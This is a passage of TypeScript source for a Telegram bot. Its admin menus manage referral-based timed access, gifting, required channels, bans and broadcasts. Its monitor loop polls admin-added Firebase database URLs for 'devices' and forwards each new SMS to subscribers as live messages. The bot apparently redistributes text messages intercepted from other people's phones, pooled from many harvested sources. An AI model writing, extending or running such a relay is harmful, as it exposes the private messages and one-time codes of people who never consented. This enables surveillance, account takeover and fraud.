  await logSystem("info", "audit_channel_disabled", "Admin audit forwarding disabled", userId(ctx));
  await answerCallback(ctx, "Audit forwarding disabled");
  await renderAdminAuditChannel(ctx);
});
bot.action("admin_referral_min", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const minimum = Number(await getSetting("minimum_referrals", "3"));
  await answerCallback(ctx);
  await editOrReply(ctx, adminReferralText(minimum), adminReferralKeyboard(minimum));
});
bot.action(/^admin_referrals:(\d+)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const minimum = Number(ctx.match[1]);
  await setSetting("minimum_referrals", String(minimum));
  await logSystem("info", "minimum_referrals_changed", `Minimum qualified referrals set to ${minimum}`, userId(ctx));
  await answerCallback(ctx, `Minimum set to ${minimum}`);
  await renderAdminFreeAccess(ctx);
});
bot.action("admin_referrals_custom", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "referral_minimum", screen: "admin_referral_min" });
  await answerCallback(ctx);
  await editOrReply(ctx, "🎯 CUSTOM MINIMUM REFERRALS\n\nSend a whole number from 0 to 1000.\n\nSend /cancel to stop.", navKeyboard("admin_referral_min"));
});
bot.action("admin_access_duration", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const current = Math.max(1, Number(await getSetting("access_duration_minutes", "45")) || 45);
  await answerCallback(ctx);
  await editOrReply(
    ctx,
    `⏱ ACCESS DURATION\n\nCurrent duration: ${current} minutes.\n\nChoose a preset or send a custom whole number from 1 to 1440.`,
    {
      inline_keyboard: [
        [15, 30, 45, 60, 120].map(value => ({
          text: `${value === current ? "✅ " : ""}${value} min`,
          callback_data: `admin_access_duration_set:${value}`
        })),
        [{ text: "✏️ Custom Duration", callback_data: "admin_access_duration_custom" }],
        [{ text: "⬅️ Free Access", callback_data: "admin_free" }, { text: "🏠 Home", callback_data: "home" }]
      ]
    }
  );
});
bot.action(/^admin_access_duration_set:(\d+)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const duration = Number(ctx.match[1]);
  await setSetting("access_duration_minutes", String(duration));
  await logSystem("info", "access_duration_changed", `Timed access duration set to ${duration} minutes`, userId(ctx));
  await answerCallback(ctx, `Duration set to ${duration} minutes`);
  await renderAdminFreeAccess(ctx);
});
bot.action("admin_access_duration_custom", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "access_duration", screen: "admin_free" });
  await answerCallback(ctx);
  await editOrReply(ctx, "⏱ CUSTOM ACCESS DURATION\n\nSend a whole number from 1 to 1440 minutes.\n\nSend /cancel to stop.", navKeyboard("admin_access_duration"));
});
bot.action("admin_gift_access", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { screen: "admin_gift_access", giftAccessTargetId: undefined });
  await answerCallback(ctx);
  await editOrReply(ctx, adminGiftAccessText(), adminGiftAccessKeyboard());
});
bot.action("admin_gift_specific", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "gift_access_user", screen: "admin_gift_access", giftAccessTargetId: undefined });
  await answerCallback(ctx);
  await editOrReply(ctx, adminGiftSpecificText(), navKeyboard("admin_gift_access"));
});
bot.action(/^admin_gift:all:(35|60)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const duration = Number(ctx.match[1]);
  const count = await grantTimedAccessToAllUsers(duration);
  await logSystem("info", "admin_gift_access", `Granted ${duration} minutes to ${count} users`, userId(ctx));
  await answerCallback(ctx, `${duration === 60 ? "1 hour" : `${duration} minutes`} gifted to ${count} users`);
  await editOrReply(ctx, `✅ ${duration === 60 ? "1 hour" : `${duration} minutes`} access gifted to ${count} users.`, adminGiftAccessKeyboard());
});
bot.action(/^admin_gift:specific:(\d+):(35|60)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const target = Number(ctx.match[1]);
  const duration = Number(ctx.match[2]);
  const count = await grantTimedAccessToUsers([target], duration);
  if (!count) {
    await answerCallback(ctx, "User ID not found.", { show_alert: true });
    return;
  }
  await logSystem("info", "admin_gift_access", `Granted ${duration} minutes to user ${target}`, userId(ctx));
  await answerCallback(ctx, `${duration === 60 ? "1 hour" : `${duration} minutes`} gifted`);
  await editOrReply(ctx, `✅ ${duration === 60 ? "1 hour" : `${duration} minutes`} access gifted to ${target}.`, adminGiftAccessKeyboard());
});
bot.action("admin_free_pool", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminFreePool(ctx); } });
bot.action("admin_free_pool_add", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "free_firebase_url", screen: "admin_free_pool" });
  await answerCallback(ctx);
  await editOrReply(ctx, "➕ ADD FIREBASE SOURCES\n\nSend one or many Firebase URLs, one per line or separated by commas.\n\nOptional display name format (one per line):\nPanel 1 | https://project-default-rtdb.firebaseio.com\nPanel 2 | https://another-project.firebaseio.com\n\nEvery source is checked before activation, and the result shows devices before, new devices, and devices after.\n\nSend /cancel to stop.", navKeyboard("admin_free_pool"));
});
bot.action(/^admin_free_pool_remove:(.+)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  await removeFreeFirebasePanel(ctx.match[1]);
  invalidatePoolSnapshot();
  await logSystem("info", "free_firebase_removed", `Removed reward pool panel ${ctx.match[1]}`, userId(ctx));
  await answerCallback(ctx, "Free Firebase removed");
  await renderAdminFreePool(ctx);
});
bot.action("admin_channels", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminChannels(ctx); } });
bot.action("admin_channel_add", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "required_channel", screen: "admin_channels" });
  await answerCallback(ctx);
  await editOrReply(ctx, "➕ ADD REQUIRED CHANNEL\n\nSend a public channel username:\n@yourchannel\n\nOr include an invite link:\n@yourchannel | https://t.me/yourchannel\n\nThe bot must be an admin/member of the channel to verify joins.\n\nSend /cancel to stop.", navKeyboard("admin_channels"));
});
bot.action(/^admin_channel_remove:(.+)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  await removeRequiredChannel(ctx.match[1]);
  await logSystem("info", "required_channel_removed", `Removed required channel ${ctx.match[1]}`, userId(ctx));
  await answerCallback(ctx, "Required channel removed");
  await renderAdminChannels(ctx);
});
bot.action(/^admin_user:(-?\d+)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const target = Number(ctx.match[1]);
  const user = (await getAdminUsers(100)).find(candidate => candidate.telegramId === target);
  if (!user) {
    await answerCallback(ctx, "User not found", { show_alert: true });
    return;
  }
  await answerCallback(ctx);
  await editOrReply(ctx, adminUserText(user), adminUserKeyboard(user));
});
bot.action(/^admin_user_apply:(-?\d+):(ban|unban)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const target = Number(ctx.match[1]);
  if (target === userId(ctx)) {
    await answerCallback(ctx, "You cannot change your own access.", { show_alert: true });
    return;
  }
  const banned = ctx.match[2] === "ban";
  const user = (await getAdminUsers(100)).find(candidate => candidate.telegramId === target);
  if (!user) {
    await answerCallback(ctx, "User not found", { show_alert: true });
    return;
  }
  await setUserBanned(target, banned);
  await logSystem("info", banned ? "user_banned" : "user_unbanned", `Admin changed access for ${target}`, userId(ctx));
  await answerCallback(ctx, banned ? "User blocked" : "User unblocked");
  await renderAdminUsers(ctx);
});
bot.action(/^admin_limit:(2|5|10|20)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  await setSetting("firebase_limit", "0");
  await logSystem("info", "firebase_limit_removed", "Firebase connection limit is unlimited", userId(ctx));
  await answerCallback(ctx, "Firebase limit removed");
  await renderAdminSettings(ctx);
});
bot.action("broadcast", async ctx => { if (await guard(ctx) && admin(ctx)) { setSession(userId(ctx), { awaiting: "broadcast" }); await answerCallback(ctx); await editOrReply(ctx, "━━━━━━━━━━━━━━━━━━━━\n📢 BROADCAST\n━━━━━━━━━━━━━━━━━━━━\n\nSend the message you want to broadcast.\n\nThe message will be previewed before sending.", navKeyboard("admin")); } });
bot.action("maintenance", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const current = await getSetting("maintenance_mode", "false");
  await setSetting("maintenance_mode", current === "true" ? "false" : "true");
  await logSystem("info", "maintenance_toggled", `Maintenance mode ${current === "true" ? "off" : "on"}`, userId(ctx));
  await answerCallback(ctx, `Maintenance ${current === "true" ? "OFF" : "ON"}`);
  await renderAdmin(ctx);
});
bot.action("logs", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const logs = await (await import("./db.js")).query<{ level: string; event: string; detail: string; created_at: string }>("SELECT level, event, detail, created_at FROM system_logs ORDER BY created_at DESC LIMIT 15");
  await answerCallback(ctx);
  await editOrReply(ctx, "━━━━━━━━━━━━━━━━━━━━\n📝 SYSTEM LOGS\n━━━━━━━━━━━━━━━━━━━━\n\n" + (logs.map(l => `${l.level.toUpperCase()} · ${l.event}\n${l.detail ?? ""}\n${l.created_at}`).join("\n\n") || "No logs yet."), navKeyboard("admin"));
});
bot.action(/^broadcast_send:(.+)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const text = Buffer.from(ctx.match[1], "base64url").toString();
  const users = await (await import("./db.js")).query<{ telegram_id: string }>("SELECT telegram_id FROM users WHERE is_banned = false");
  let sent = 0, failed = 0;
  for (const target of users) {
    try { await ctx.telegram.sendMessage(Number(target.telegram_id), text); sent++; } catch { failed++; }
  }
  await answerCallback(ctx, "Broadcast complete");
  await editOrReply(ctx, `📊 BROADCAST COMPLETE\n\n✅ Sent: ${sent}\n❌ Failed: ${failed}\n🚫 Blocked: ${failed}`, navKeyboard("admin"));
});

function startMonitor(
  telegramId: number,
  firebaseId: string,
  device: Device,
  target: Pick<DeviceMonitor, "chatId" | "messageId" | "sourceName"> = {}
) {
  const key = `${telegramId}:${firebaseId}:${device.normalizedDeviceId}`;
  if (monitors.has(key)) return;
  let initialized = false;
  let monitor: DeviceMonitor | undefined;
  const isActive = () => Boolean(monitor?.active && monitors.get(key) === monitor);
  const poll = async () => {
    if (!isActive()) return;
    try {
      if (telegramId !== config.ADMIN_TELEGRAM_ID && !(await getAccessStatus(telegramId)).active) {
        stopMonitor(telegramId, firebaseId, device.normalizedDeviceId);
        return;
      }
      const connection = await getConnection(telegramId, firebaseId);
      if (!isActive()) return;
      if (!connection) {
        stopMonitor(telegramId, firebaseId, device.normalizedDeviceId);
        return;
      }
      const root = await readFirebase(connection.firebaseUrl);
      if (!isActive()) return;
      const latestDevices = extractDevices(root);
      await replaceDevices(firebaseId, latestDevices);
      await markConnectionChecked(firebaseId, "connected");
      const latest = latestDevices.find(d => d.normalizedDeviceId === device.normalizedDeviceId);
      if (!latest) {
        if (monitor?.chatId && monitor.messageId) {
          try {
            await bot.telegram.editMessageText(
              monitor.chatId,
              monitor.messageId,
              undefined,
              "⚠️ The selected device is no longer present in the latest Firebase snapshot.",
              { reply_markup: premiumizeKeyboard(navKeyboard("home")) as any }
            );
          } catch {
            // The user may have navigated away or the message may be stale.
          }
        }
        stopMonitor(telegramId, firebaseId, device.normalizedDeviceId);
        return;
      }
      if (
        monitor?.chatId &&
        monitor.messageId &&
        monitor.sourceName &&
        getSession(telegramId).screen === "device_detail" &&
        getSession(telegramId).selectedFirebaseId === firebaseId &&
        getSession(telegramId).selectedDeviceId === latest.normalizedDeviceId
      ) {
        try {
          await bot.telegram.editMessageText(
            monitor.chatId,
            monitor.messageId,
            undefined,
            deviceDetailText(latest, monitor.sourceName),
            { reply_markup: premiumizeKeyboard(deviceDetailKeyboard(firebaseId, latest.normalizedDeviceId)) as any }
          );
        } catch {
          // Telegram rejects no-op edits and edits to messages that were replaced.
        }
      }
      // SMS/event data is sometimes stored beside the device branch or keyed
      // by the selected phone number, so search the full snapshot as well.
      const events = collectEvents(latest, root);
      if (!initialized) {
        for (const event of events) {
          if (!isActive()) return;
          await markEventSeen(telegramId, firebaseId, latest.normalizedDeviceId, event.id, event.fingerprint);
        }
        if (!isActive()) return;
        initialized = true;
        return;
      }
      for (const event of events) {
        if (!isActive()) return;
        if (await eventSeen(firebaseId, latest.normalizedDeviceId, event.id)) continue;
        if (!isActive()) return;
        await markEventSeen(telegramId, firebaseId, latest.normalizedDeviceId, event.id, event.fingerprint);
        if (!isActive()) return;
         await bot.telegram.sendMessage(telegramId, liveSmsText(latest, event.message, event.timestamp));
      }
    } catch (error) { await logSystem("error", "event_monitor_failed", error instanceof Error ? error.message : String(error), telegramId); }
  };
  monitor = {
    active: true,
    timer: setInterval(() => { void poll(); }, config.FIREBASE_SCAN_INTERVAL_MS),
    ...target
  };
  monitors.set(key, monitor);
  void poll();
}

function stopMonitor(telegramId: number, firebaseId: string, normalized: string) {
  const key = `${telegramId}:${firebaseId}:${normalized}`;
  const monitor = monitors.get(key);
  if (monitor) {
    monitor.active = false;
    clearInterval(monitor.timer);
  }
  monitors.delete(key);
}

function unselectDevice(telegramId: number) {
  // Stop every monitor owned by this user so an older/stale selection cannot
  // keep delivering messages after the user leaves the device screen.
  for (const [key, monitor] of monitors) if (key.startsWith(`${telegramId}:`)) {
    monitor.active = false;
    clearInterval(monitor.timer);
    monitors.delete(key);
  }
  stopHomeMonitor(telegramId);
  setSession(telegramId, {
    selectedFirebaseId: undefined,
    selectedDeviceId: undefined,
    monitoring: false,
  });
}

function stopMonitorsFor(firebaseId: string) {
  for (const [key, monitor] of monitors) if (key.includes(`:${firebaseId}:`)) {
    monitor.active = false;
    clearInterval(monitor.timer);
    monitors.delete(key);
  }
}

bot.catch(async (error, ctx) => { await logSystem("error", "unexpected_exception", error instanceof Error ? error.message : String(error), ctx.from?.id); });
process.once("SIGINT", async () => {
  stopPoolRefreshLoop();
  for (const monitor of monitors.values()) { monitor.active = false; clearInterval(monitor.timer); }
  await pool.end();
  bot.stop("SIGINT");
});
process.once("SIGTERM", async () => {
  stopPoolRefreshLoop();
  for (const monitor of monitors.values()) { monitor.active = false; clearInterval(monitor.timer); }
  await pool.end();
  bot.stop("SIGTERM");
});

export async function startTelegramBot(): Promise<void> {
  logger.info("Initializing Telegram bot database schema");
  await ensureSchema();
  logger.info("Telegram bot database schema ready");
  const me = await bot.telegram.getMe();
  botUsername = me.username ?? "";
  void bot.launch({ dropPendingUpdates: true }).catch(async error => {
    await logSystem("error", "telegram_polling_failed", error instanceof Error ? error.message : String(error));
    logger.error({ err: error }, "Telegram polling stopped");
  });
  startPoolRefreshLoop();
  logger.info("Telegram polling client initialized");
}